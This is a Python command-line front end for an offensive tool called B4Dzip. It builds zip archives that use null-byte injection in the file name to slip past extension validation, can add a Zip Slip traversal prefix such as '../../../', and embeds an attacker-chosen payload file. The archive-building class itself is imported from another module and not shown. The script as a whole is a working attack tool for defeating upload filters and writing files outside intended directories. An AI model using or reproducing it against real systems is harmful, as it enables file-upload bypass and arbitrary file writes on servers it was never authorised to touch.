import argparse

from models.badzip import BadZip


def create_parser():
    parser = argparse.ArgumentParser(
                    prog='B4Dzip',
                    description="""Creates a zip file for bypassing the validation
                                of the central directory header filename extension 
                                by performing Null Byte injection.""")

    parser.add_argument('-F', '--file', help='Name of the file to compress', required=True)
    parser.add_argument('-E', '--ext', help='Extension to append after NULL Byte injection.', required=True)
    parser.add_argument('-P', '--payload', help='File path of the payload', required=True)
    parser.add_argument('-S', '--zip-slip' ,help='Zip Slip parent directory, something like: ../../../')
    parser.add_argument('-O', '--output-fname', help='Output file name', default='b4d.zip')
    return parser


def read_payload(payload_path):
    return open(payload_path, "rb").read()


def main():
    parser = create_parser()
    args = parser.parse_args()

    if args.zip_slip:
        args.file = args.zip_slip + args.file

    payload = read_payload(args.payload)
    bz = BadZip(args.file, args.ext, payload)
    bz.build_zip(save=True, output_fname=args.output_fname)


if __name__ == '__main__':
    main()
